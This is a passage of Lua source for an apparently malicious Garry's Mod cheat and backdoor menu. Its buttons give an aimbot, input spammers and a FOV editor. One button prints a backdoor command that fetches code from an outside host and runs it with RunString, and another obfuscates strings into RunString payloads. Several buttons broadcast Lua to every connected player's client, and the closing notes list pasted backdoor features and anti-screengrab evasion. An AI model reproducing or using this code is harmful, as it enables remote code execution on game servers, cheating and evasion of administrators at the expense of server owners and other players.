    wtf.Log("Check Console")
    wtf.conoutRGB("NET DUMP LOCATION: GarrysMod\\garrysmod\\data\\"..name)
end)

CreateButton("W0RST-BD | Method", TabMisc, 110, 25, 260, 10, function()
    MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm', RunString) end)\n")
    wtf.Log("Check Console")
end)

CreateButton("Rainbow-Physgun", TabMisc, 110, 25, 380, 10, function()
    if(RainbowEnable == false) then
        wtf.Log("RGB-Physgun Enabled")
        RainbowEnable=true
    else
        wtf.Log("RGB-Physgun Disabled")
        RainbowEnable=false
    end
end)

CreateButton("Use-Spammer", TabMisc, 110, 25, 20, 40, function()
    if(UseSpamEnable == false) then
        wtf.Log("Use Spammer Enabled")
        UseSpamEnable=true
        timer.Create(UseTimer, 0.1,0, function()
            RunConsoleCommand("+use"); timer.Simple(0.2, function() RunConsoleCommand("-use") end)
        end)
    else
        wtf.Log("Use Spammer Disabled")
        timer.Remove(UseTimer)
        UseSpamEnable=false
    end
end)

CreateButton("Flash-Spammer", TabMisc, 110, 25, 140, 40, function()
    if(FlashSpamEnable == false) then
        wtf.Log("Flash Spammer Enabled")
        hook.Add("Tick", FSHook , function() LocalPlayer():ConCommand("impulse 100") end)
        FlashSpamEnable=true
    else
        wtf.Log("Flash Spammer Disabled")
        hook.Remove("Tick", FSHook )
        FlashSpamEnable=false
    end
end)

CreateButton("FOV-Editor", TabMisc, 110, 25, 260, 40, function()
    Derma_StringRequest("Edit Fov", "Set Fov To:", "", function(str)
        LocalPlayer():ConCommand("fov_desired "..str)
        wtf.Log("FOV Set: "..str)
    end)
end)

CreateButton("Encode-String", TabMisc, 110, 25, 380, 40, function()
    Derma_StringRequest("Encode String", "String To Encode", "", function(str)
        local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
        wtf.conoutRGB("ENCODED-STRING: ".."RunString("..encoded..")")
        SetClipboardText("RunString('"..encoded.."')")
        wtf.Log("Check Console")
      end)
end)

CreateSlider("Fov:", TabMisc, FovCircle, 140, 70)
CreateCheckbox("Aimbot L-ALT", TabMisc, 20, 70, function()
    AimbotEnable = !AimbotEnable
    if(AimbotEnable == false) then
        wtf.Log("Aimbot Disabled")
    elseif(AimbotEnable == true) then
        wtf.Log("Aimbot Enabled")
    end
end)

CreateButton("Play URL-Link", TabSounds, 120, 35, 385, 520, function()
    Derma_StringRequest("Play URL", "URL:", "", function(str)
        wtf.SendLua([[BroadcastLua("sound.PlayURL(']]..str..[[' , 'mono', function() end)")]])
        wtf.Log("Playing: " .. str)
    end)
end)

CreateButton("Stop Sounds", TabSounds, 120, 35, 255, 520, function()
    wtf.SendLua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
    wtf.Log("Stopped Sounds")
end)

CreateSoundButtons() --/ creates all sound buttons

--## NOTES
--## New Pasted backdoor features
--## Textured Background for menu
--## Third-Person / Any Fov
--## Anti-Screengrab
